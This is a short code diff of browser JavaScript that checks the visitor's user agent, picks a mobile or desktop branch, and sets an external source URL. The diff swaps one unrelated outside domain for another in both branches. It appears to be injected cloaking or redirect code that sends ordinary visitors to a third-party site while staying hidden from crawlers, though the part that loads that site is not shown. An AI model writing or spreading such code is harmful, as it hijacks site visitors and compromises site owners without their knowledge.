@@ -3,10 +3,10 @@ if (!reg.test(navigator.userAgent)) {
 let flag = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);
 if (flag) {
 //k
-_src = 'https://bob.wlkepu.com/'
+_src = 'https://vip.yongzhengmould.com/'
 } else {
 // PC
-_src = 'https://bob.wlkepu.com/'
+_src = 'https://vip.yongzhengmould.com/'
 }
 document.write('<meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1">');
 var hd = document.head;
